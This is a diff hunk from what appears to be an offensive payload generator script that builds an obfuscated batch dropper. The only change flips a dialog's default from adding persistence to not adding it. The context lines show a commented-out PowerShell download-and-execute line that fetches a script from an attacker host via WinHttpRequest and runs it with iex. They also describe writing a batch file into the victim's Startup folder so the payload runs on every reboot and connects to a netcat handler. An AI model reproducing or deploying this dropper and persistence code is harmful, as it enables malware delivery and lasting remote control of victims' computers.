@@ -12362,7 +12362,7 @@ echo "---"
 ## BUILD DROPPER (to download/execute our agent.ps1).
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will download/exec our '$NaM.ps1'\n(to the UPLOAD Location chosen by attacker) and writes 'Persiste.bat' into target\nStartup folder. ( Persiste.bat will execute our '$NaM.ps1' on every reboot )\n\nThe attacker just needs to start one netcat handler on sellected port." --radiolist --column "Pick" --column "Option" FALSE "No (default)" TRUE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
+persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will download/exec our '$NaM.ps1'\n(to the UPLOAD Location chosen by attacker) and writes 'Persiste.bat' into target\nStartup folder. ( Persiste.bat will execute our '$NaM.ps1' on every reboot )\n\nThe attacker just needs to start one netcat handler on sellected port." --radiolist --column "Pick" --column "Option" TRUE "No (default)" FALSE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
 
 if [ "$persistence" = "No (default)" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
